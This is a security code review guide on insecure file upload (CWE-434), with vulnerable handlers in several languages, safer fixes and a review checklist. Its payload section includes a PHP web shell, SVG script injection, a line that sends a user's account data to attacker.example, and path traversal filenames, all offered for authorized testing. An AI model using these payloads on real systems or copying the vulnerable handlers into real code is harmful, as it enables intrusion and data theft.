---
title: Review Insecure File Upload
keywords:
  - security code review
  - file upload
  - malicious upload
  - content type
  - stored malware
description: How to read code for insecure file upload handling where attackers store executable or oversized content served to other users.
---

## 4.29 - Review Insecure File Upload

File uploads extend the attack surface to stored content and sometimes execution. Review avatar, attachment, import, and CMS media endpoints. Trace how the server validates type and size, where files land on disk or object storage, and whether users or the application later serve them as active content.

## What This Vulnerability Is

Insecure file upload handling allows attackers to place unexpected content on server storage. Risks include uploading web shells when files land under a web root, cross-site content when browsers interpret uploads as HTML or SVG, virus propagation, quota exhaustion, and metadata tricks that bypass extension checks.

The unsafe assumption is that the client `Content-Type` or file extension reflects true content. Attackers use polyglot files, double extensions, and MIME sniffing to turn "images" into executable pages. This maps to [CWE-434](https://cwe.mitre.org/data/definitions/434.html) (Unrestricted Upload of File with Dangerous Type).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Avatar, attachment, import, CMS media, presigned object uploads |
| **Storage location** | Web-accessible `public/`, servlet context roots, shared buckets with public ACL |
| **Validation order** | Extension-only checks, client `Content-Type` trusted, size limits after full buffer |
| **Naming** | Preserving `originalFilename` from client as on-disk path component |
| **Active content** | SVG/HTML allowed as inline "images", user MIME echoed on download |
| **AuthZ gaps** | Upload without matching download permission for other users' objects |

## Attack Payloads

Use these in authorized tests on upload endpoints. Abuse scenarios include web shells, stored XSS via SVG/HTML, and quota exhaustion.

### Pattern 1: Web shell under web root (upload abuse scenario)

```text
Filename: shell.php.jpg or shell.jsp
Content: <?php system($_GET['cmd']); ?>
```

Stored under `public/uploads/` and executed by the web server.

### Pattern 2: Double extension and MIME mismatch

```text
report.pdf.exe
image.png  (polyglot with HTML/script)
Content-Type: image/jpeg  (client lie; body is HTML)
```

### Pattern 3: SVG and HTML active content

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

```html
<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://attacker.example/?'+btoa(JSON.stringify(d))))</script>
```

### Pattern 4: Path traversal in original filename

```text
filename=../../../static/evil.js
```

### Pattern 5: Oversized and zip bomb uploads

```text
10GB file or highly compressible blob to exhaust disk/RAM during scan
```

### Pattern 6: Content sniffing bypass

```text
GIF89a<?php ... ?>   # magic bytes + executable payload
```

## Language-Specific Sinks and Dangerous APIs

Search for save paths, extension checks, and download handlers that trust client metadata.

### Python

```python
file.save(os.path.join("static", file.filename))
werkzeug secure_filename omitted
return send_file(upload_path, mimetype=file.content_type)
```

Flask `request.files`; Django `FileField` saved to `MEDIA_ROOT` under web root.

### Java

```java
part.write(uploadDir + File.separator + part.getSubmittedFileName());
Files.copy(stream, Paths.get(publicDir, originalName));
```

Spring `MultipartFile.transferTo`; servlet `Part` without content sniffing.

### C#

```csharp
file.CopyTo(Path.Combine(_webRoot, file.FileName));
return PhysicalFile(path, file.ContentType);
```

`IFormFile` saved with client `FileName`; missing virus scan and size cap before buffer.

### JavaScript (Node.js)

```javascript
const dest = path.join("public", req.file.originalname);
fs.writeFileSync(dest, req.file.buffer);
multer({ dest: "uploads/" })
```

### Go

```go
os.WriteFile(filepath.Join("static", header.Filename), data, 0644)
```

### Object storage

```text
s3.put_object(Key=user_key, ACL='public-read')  # user-controlled key under web bucket
```

## Sample Vulnerable Code in Python

```python
import uuid
from pathlib import Path
from fastapi import FastAPI, File, UploadFile

app = FastAPI()
MEDIA_ROOT = Path("/var/www/html/media")

@app.post("/media/upload")
async def media_upload(file: UploadFile = File(...)):
    # Extension-only check; client filename used under web root
    if file.filename.endswith((".png", ".jpg", ".jpeg")):
        dest = MEDIA_ROOT / file.filename
        dest.write_bytes(await file.read())
    return {"ok": True}
```

## Step-by-Step Review Walkthrough

1. **Locate multipart handlers and presigned upload APIs.** Trace from receive to persist to serve.
2. **Trace the media upload handler.** In the sample, extension checks miss polyglots and the client filename lands under a web-served directory.
3. **Check validation order.** Enforce size limits before buffering entire files into memory.
4. **Review stored location.** Files under executable web roots with predictable names enable direct URL access.
5. **Inspect renaming strategy.** Server-generated keys must replace client-supplied basenames on disk.
6. **Trace download responses.** Use safe `Content-Type` and `Content-Disposition: attachment` for sensitive types.
7. **Confirm authorization on fetch.** Multi-tenant uploads need matching download permission checks.

## Risk Impact Analysis

**Remote code execution.** Web shells in public directories execute when the server interprets uploads as scripts.

**Stored XSS via SVG/HTML.** Inline serving of "image" types that carry script affects other users' browsers.

**Malware hosting and reputation harm.** The application becomes a distribution point for malicious files.

**Denial of service.** Missing quotas and size limits allow disk and memory exhaustion.

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/upload")
public void upload(HttpServletRequest req, HttpServletResponse resp) throws Exception {
    Part part = req.getPart("file");
    String name = part.getSubmittedFileName();
    part.write(getServletContext().getRealPath("/uploads/" + name));
}

@GetMapping("/uploads/{name}")
public void serve(@PathVariable String name, HttpServletResponse resp) throws IOException {
    File file = new File("/var/www/html/uploads/" + name);
    Files.copy(file.toPath(), resp.getOutputStream());
}
```

### C#

```csharp
[HttpPost("upload")]
public async Task<IActionResult> Upload(IFormFile file)
{
    var path = Path.Combine(_env.WebRootPath, "uploads", file.FileName);
    using var stream = new FileStream(path, FileMode.Create);
    await file.CopyToAsync(stream);
    return Ok(new { url = "/uploads/" + file.FileName });
}

[HttpPost("import")]
public async Task<IActionResult> Import(IFormFile file)
{
    if (Path.GetExtension(file.FileName).Equals(".jsp", StringComparison.OrdinalIgnoreCase))
        return BadRequest("JSP not allowed");
    var path = Path.Combine(_uploadRoot, file.FileName);
    await using var fs = new FileStream(path, FileCreate);
    await file.CopyToAsync(fs);
    return Ok();
}
```

### Go

```go
func upload(w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20)
    file, header, _ := r.FormFile("file")
    defer file.Close()
    out, _ := os.Create("/var/www/html/uploads/" + header.Filename)
    io.Copy(out, file)
}

func serveUpload(w http.ResponseWriter, r *http.Request) {
    name := mux.Vars(r)["name"]
    http.ServeFile(w, r, filepath.Join("/var/www/html/uploads", name))
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Generate server-side storage keys. Store outside the web root. Verify content with Pillow or magic bytes.

```python
import uuid
from pathlib import Path

from flask import Flask, abort, request
from PIL import Image
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_ROOT = Path("/var/data/uploads")  # not under static/
ALLOWED_EXT = {".png", ".jpg", ".jpeg"}
MAX_BYTES = 5 * 1024 * 1024

@app.route("/upload", methods=["POST"])
def upload():
    f = request.files.get("file")
    if not f:
        abort(400)
    data = f.read(MAX_BYTES + 1)
    if len(data) > MAX_BYTES:
        abort(413)
    ext = Path(secure_filename(f.filename)).suffix.lower()
    if ext not in ALLOWED_EXT:
        abort(400)
    # Re-encode image to strip active content and verify format
    from io import BytesIO
    img = Image.open(BytesIO(data))
    img.verify()
    img = Image.open(BytesIO(data))
    key = f"{uuid.uuid4().hex}{ext}"
    out = UPLOAD_ROOT / key
    img.save(out, format=img.format)
    return {"id": key}
```

**Important:** Serve downloads through an authenticated endpoint with safe headers, not direct static URLs.

### Java

Store as random UUID keys outside the web root. Serve through a controlled servlet.

```java
String original = part.getSubmittedFileName();
String ext = validateExtension(original);
String key = UUID.randomUUID() + ext;
Path dest = uploadRoot.resolve(key); // uploadRoot not under webapp root
try (InputStream in = part.getInputStream()) {
    Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
}
return key;
```

### C#

Validate signature bytes. Store in private blob storage, not `WebRootPath`.

```csharp
public async Task<IActionResult> Upload(IFormFile file)
{
    if (file.Length > MaxBytes) return BadRequest();
    await using var ms = new MemoryStream();
    await file.CopyToAsync(ms);
    if (!IsAllowedImage(ms))
        return BadRequest("Invalid file type");
    var key = $"{Guid.NewGuid():N}.png";
    await _storage.SaveAsync(key, ms.ToArray());
    return Ok(new { id = key });
}
```

### Go

Limit bytes read. Use random hex names. Detect content type from first 512 bytes.

```go
import (
    "bytes"
    "crypto/rand"
    "encoding/hex"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func upload(w http.ResponseWriter, r *http.Request) {
    r.Body = http.MaxBytesReader(w, r.Body, 5<<20)
    file, header, err := r.FormFile("file")
    if err != nil {
        http.Error(w, "bad request", 400)
        return
    }
    defer file.Close()
    buf := make([]byte, 512)
    n, _ := file.Read(buf)
    ctype := http.DetectContentType(buf[:n])
    if !strings.HasPrefix(ctype, "image/") {
        http.Error(w, "invalid type", 400)
        return
    }
    rnd := make([]byte, 16)
    rand.Read(rnd)
    key := hex.EncodeToString(rnd) + filepath.Ext(header.Filename)
    out, err := os.Create(filepath.Join(uploadRoot, key))
    if err != nil {
        http.Error(w, "server error", 500)
        return
    }
    defer out.Close()
    io.Copy(out, io.MultiReader(bytes.NewReader(buf[:n]), file))
}
```

## Verify During Review

- Uploads are stored outside executable web roots or served through controlled endpoints with safe headers.
- Filenames on disk are server-generated; client-supplied names are not used as path components.
- Type validation uses content inspection and allowlists appropriate to the business need.
- Size, rate, and per-user quotas limit abuse and DoS via large files.
- Authorization covers upload, list, download, and delete for multi-tenant data.
- Uploaded content is scanned or transformed where policy requires before other users can access it.

## Reference

- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Flask — Uploading files](https://flask.palletsprojects.com/en/stable/patterns/fileuploads/)
- [Werkzeug — secure_filename](https://werkzeug.palletsprojects.com/en/stable/utils/#werkzeug.utils.secure_filename)
- [Pillow — Image.verify](https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.verify)
- [Java Servlet Part API](https://jakarta.ee/specifications/servlet/6.0/apidocs/jakarta.servlet/jakarta/servlet/http/part)
- [ASP.NET Core — IFormFile](https://learn.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.http.iformfile)
- [Go http.MaxBytesReader](https://pkg.go.dev/net/http#MaxBytesReader)
